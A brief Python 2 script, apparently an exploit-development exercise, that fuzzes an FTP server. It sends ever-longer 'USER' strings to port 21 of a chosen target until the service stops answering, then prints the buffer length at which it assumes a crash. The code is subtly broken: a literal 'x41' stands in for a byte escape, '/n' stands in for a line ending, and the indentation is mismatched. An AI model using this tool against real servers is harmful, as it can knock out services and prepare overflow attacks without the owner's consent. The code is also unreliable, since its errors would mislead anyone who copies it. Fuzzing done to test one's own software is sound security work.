#!/usr/bin/python

import sys
import socket
from time import sleep

# usage python fuzzFTPserver.py <target>

######### Creates a fuzzer for FTP server using A's for USER input ##########

def fuzzServer(target):
    buffer = 'x41'*50

    while True:
        try:   # create connection to target on TCP, port 21
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 21))
            s.recv(1024)
            print "[+] Creating TCP/21 connection on Target... "

            # send in the string 'USER' + the string 'buffer'
            s.send("USER "+buffer+"/n")
            s.close()
            sleep(1)
            # increments buffer string
            buffer = buffer + 'x41'*50

         except:  # if not successful, assume its crashed 
             print "[-] Crashed! with buffer length: "+str(len(buffer)-50)
             sys.exit()
 

   


######### main ###########
if __name__ == "__main__":
   target = sys.argv[1]
   fuzzServer(target)
